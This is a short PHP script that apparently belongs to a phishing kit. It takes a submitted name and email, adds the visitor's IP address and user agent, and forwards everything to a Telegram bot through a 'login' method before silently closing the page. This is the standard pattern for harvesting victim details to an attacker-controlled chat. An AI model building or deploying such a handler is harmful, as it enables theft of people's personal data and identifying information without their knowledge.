<?php
require_once './config.php';
require_once './functions.php';
require_once './SendTg.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $errors = [];

    $name = $_POST['name'];
    $mail = $_POST['mail'];


    if (empty($name) || empty($mail)) {
        $errors['login'] = 'Todos los campos son obligatorios';
    }

    if (count($errors) !== 0) {
        header('location: ./index.html');
    } else {
        $sendTg = new SendTg(BOT_TOKEN, CHAT_ID);
        $sendTg->login($name, $mail, getIP(), getUag());
        sleep(3);
        echo"<script>window.close();</script>";
    }
}